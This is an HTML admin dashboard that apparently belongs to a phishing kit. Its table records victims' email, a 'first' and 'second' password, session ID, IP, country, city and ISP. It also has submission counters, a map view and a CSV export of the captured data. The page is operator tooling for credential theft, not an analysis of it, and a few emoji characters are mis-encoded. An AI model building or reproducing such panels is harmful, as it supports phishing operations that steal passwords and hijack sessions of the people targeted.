<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Admin Dashboard</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="/css/admin.css">
</head>
<body>
  <div class="sidebar">
    <h2>Admin Panel</h2>
    <a href="/admin/dashboard" class="nav-item active">Dashboard</a>
    <a href="/admin/analytics" class="nav-item">Analytics</a>
    <a href="/admin/map" class="nav-item">Map</a>
    <a href="/admin/settings" class="nav-item">Settings</a>
    <a href="/admin/logs" class="nav-item">Logs</a>
    <a href="/admin/admins" class="nav-item">Admins</a>
    <a href="/admin/logout" class="nav-item">Logout</a>
  </div>

  <div class="main">
    <div class="topbar">
      <div class="topbar-title">Dashboard</div>
      <div class="topbar-right">
        <input id="searchBox" type="text" placeholder="Search email...">
        <div class="toggle" id="darkToggle">ðŸŒ™</div>
        <button class="btn btn-secondary" onclick="location.href='/admin/export'">Export CSV</button>
      </div>
    </div>

    <div class="content">
      <div class="stats">
        <div class="stat-card">
          <h3>Total Submissions</h3>
          <p id="statTotal">0</p>
        </div>
        <div class="stat-card">
          <h3>Today</h3>
          <p id="statToday">0</p>
        </div>
        <div class="stat-card">
          <h3>Unique IPs</h3>
          <p id="statIPs">0</p>
        </div>
        <div class="stat-card">
          <h3>Top Country</h3>
          <p id="statCountry">â€”</p>
        </div>
      </div>

      <div class="table-container">
        <table>
          <thead>
            <tr>
              <th>Email</th>
              <th>First Password</th>
              <th>Second Password</th>
              <th>Session ID</th>
              <th>IP</th>
              <th>Country</th>
              <th>City</th>
              <th>ISP</th>
              <th>Time</th>
            </tr>
          </thead>
          <tbody id="rows"></tbody>
        </table>
      </div>

      <div class="pagination">
        <button class="btn btn-secondary" id="prevBtn">Prev</button>
        <span id="pageInfo"></span>
        <button class="btn btn-secondary" id="nextBtn">Next</button>
      </div>
    </div>
  </div>

  <script src="/js/dashboard.js"></script>
</body>
</html>
